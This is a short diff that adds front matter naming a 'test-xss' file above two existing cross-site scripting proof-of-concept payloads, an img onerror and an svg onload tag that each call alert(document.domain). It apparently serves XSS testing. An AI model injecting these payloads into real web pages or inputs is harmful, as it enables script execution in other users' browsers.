@@ -1,3 +1,8 @@
+---
+name: test-xss 
+description: "test."
+---
+
   <img src=x onerror=alert(document.domain)>
 
   <svg onload=alert(document.domain)>
